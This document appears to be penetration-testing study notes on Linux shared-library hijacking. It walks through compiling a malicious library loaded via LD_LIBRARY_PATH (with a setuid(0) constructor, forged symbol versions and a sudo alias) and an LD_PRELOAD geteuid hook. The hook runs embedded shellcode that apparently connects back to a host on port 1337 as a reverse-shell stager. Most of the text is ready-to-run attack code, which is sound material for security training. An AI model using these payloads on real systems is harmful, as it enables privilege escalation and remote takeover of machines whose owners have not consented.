# Shared Libraries

## How Shared Libraries Work on Linux

**Library Order**

{% code overflow="wrap" %}
```
1. Directories listed in the application's RPATH value.
2. Directories specified in the LD_LIBRARY_PATH environment variable.
3. Directories listed in the application's RUNPATH value.
4. Directories specified in /etc/ld.so.conf.
5. System library directories: /lib, /lib64, /usr/lib, /usr/lib64, /usr/local/lib, /usr/local/lib64, and potentially others.
```
{% endcode %}

## Hijacking via LD\_LIBRARY\_PATH

```bash
# Create alias
alias sudo="sudo -E"
mkdir ldlib
cd ldlib
```

A basic example of a shared library payload

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
	setuid(0);
	setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/haxso.txt");
}
```

Compile shared library object file

```bash
gcc -Wall -fPIC -c -o hax.o hax.c
```

Compiling our finished shared library file

```bash
gcc -shared -o libhax.so hax.o
```

Determining libraries run by the "top" utility

```bash
ldd /usr/bin/top
```

Preparing the environment and shared library for exploitation

```bash
export LD_LIBRARY_PATH=/home/offsec/ldlib/
cp libhax.so libgpg-error.so.0
```

Our exploit fails miserably

{% code overflow="wrap" %}
```bash
top
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference
```
{% endcode %}

The output gets the symbols associated with our hijacked library and makes C variables for them as output

{% code overflow="wrap" %}
```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
...
int gpgrt_fflush;
int gpgrt_poll;
```
{% endcode %}

Put the new symbols in our source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
```

After recompiling and setting the _LD\_LIBRARY\_PATH_ variable again, this time when we run top, we get the result we wanted. Unfortunately, we notice an obvious error message about the shared library's version information

{% code overflow="wrap" %}
```bash
top
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
DLL HIJACKING IN PROGRESS 
```
{% endcode %}

Getting symbol names

{% code overflow="wrap" %}
```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```
{% endcode %}

Use output to create Symbol map file gpg.map

```
GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
...
gpgrt_fflush;
gpgrt_poll;

};
```

Recompiling the shared library with a symbol map

```bash
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
```

Working correctly

```bash
export LD_LIBRARY_PATH=/home/offsec/ldlib/
top
```

Modified alias to include LD\_LIBRARY\_PATH (Required for modern operating systems)

```bash
alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
```

## Hijacking via LD\_PRELOAD

Run ltrace on the cp command to get a list of library function calls

```bash
ltrace cp
```



```c
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8"
"\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

uid_t geteuid(void)
{
       typeof(geteuid) *old_geteuid;
       old_geteuid = dlsym(RTLD_NEXT, "geteuid");
       if (fork() == 0)
        {
                intptr_t pagesize = sysconf(_SC_PAGESIZE);
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
                 pagesize, PROT_READ|PROT_EXEC)) {
                        perror("mprotect");
                        return -1;
                }
                int (*ret)() = (int(*)())buf;
                ret();
        }
        else
        {
                printf("HACK: returning from function...\n");
                return (*old_geteuid)();
        }
        printf("HACK: Returning from main...\n");
        return -2;
}
```

Compiling our library

```bash
gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
```

Executing our payload

```bash
cp /etc/passwd /tmp/testpasswd
export LD_PRELOAD=/home/offsec/evil_geteuid.so
cp /etc/passwd /tmp/testpasswd
```

Clearing LD\_PRELOAD

```bash
unset LD_PRELOAD
```
